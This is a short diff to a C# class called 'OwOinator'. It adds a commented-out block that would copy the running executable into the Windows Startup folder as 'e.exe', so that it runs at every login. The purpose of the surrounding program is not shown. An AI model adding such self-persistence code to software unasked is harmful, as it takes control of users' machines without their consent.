@@ -43,6 +43,11 @@ public class OwOinator
     public static void Init()
     {
         var userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        //C:\Users\Purpl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
+
+        // try {
+        //     File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, userPath + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\e.exe");
+        // } catch (Exception) {}
 
         Analysis();
         FetchTheLambSauce();
